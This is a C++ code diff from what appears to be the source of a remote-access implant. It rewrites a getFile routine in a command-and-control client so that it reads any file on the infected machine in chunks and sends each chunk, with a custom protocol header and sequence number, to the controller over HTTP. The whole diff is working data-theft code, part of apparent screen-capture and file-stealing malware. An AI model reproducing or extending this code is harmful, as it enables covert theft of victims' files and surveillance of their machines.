@@ -89,26 +89,51 @@ LPVOID commandManager::getScreen() {
     }
 }
 
-LPVOID commandManager::getFile(std::string &path) {
+void commandManager::getFile(std::string& path) {
+    cncManager client;
     FILE* fp = NULL;
-    UCHAR* ptr = NULL;
+    UCHAR* buffer = new UCHAR[sizeof(DDprotocol)+DATA_BUF_SIZE]; //450MB
+    memset(buffer, 0, sizeof(DDprotocol) + DATA_BUF_SIZE);
+    DWORD sequence = 0;
+    ULONG64 size = 0;
+    DDprotocol proto;
+    proto.header = 0xdd;
+    proto.type = ftpResponse;
     this->file_len = 0;
 
-    int a = fopen_s(&fp, path.c_str(), "rb+");
+    fopen_s(&fp, path.c_str(), "rb+");
     if (fp) {
-        fseek(fp, 0, SEEK_END);
-        ULONG64 size = ftell(fp);
-        rewind(fp);     
+        while (!feof(fp)) {
+            size = fread(buffer + sizeof(DDprotocol), 1, DATA_BUF_SIZE, fp);
 
-        ptr = new UCHAR[size];
-        memset(ptr, 0, size);
-        fread(ptr, size, 1, fp);
+            if (sequence == 0 && size < DATA_BUF_SIZE) {
+                proto.len = size;
+                proto.seq = 0;
+                memcpy(buffer, &proto, sizeof(DDprotocol));
+                client.sendHttpRequest(buffer, sizeof(DDprotocol) + size);
+                break;
+            }
+            else if (size == DATA_BUF_SIZE) {
+                sequence++;
+                proto.len = size;
+                proto.seq = sequence;
+                memcpy(buffer, &proto, sizeof(DDprotocol));
+                client.sendHttpRequest(buffer, sizeof(DDprotocol) + size);
+            }
+            else if (sequence != 0 && size < DATA_BUF_SIZE) {
+                sequence++;
+                proto.len = size;
+                proto.seq = 0;
+                memcpy(buffer, &proto, sizeof(DDprotocol));
+                client.sendHttpRequest(buffer, sizeof(DDprotocol) + size);
+            }
+            
 
+
+        }
         fclose(fp);
-
-        this->file_len = size;
     }
-    
-    return ptr;
+    delete[] buffer;
 
 }
+
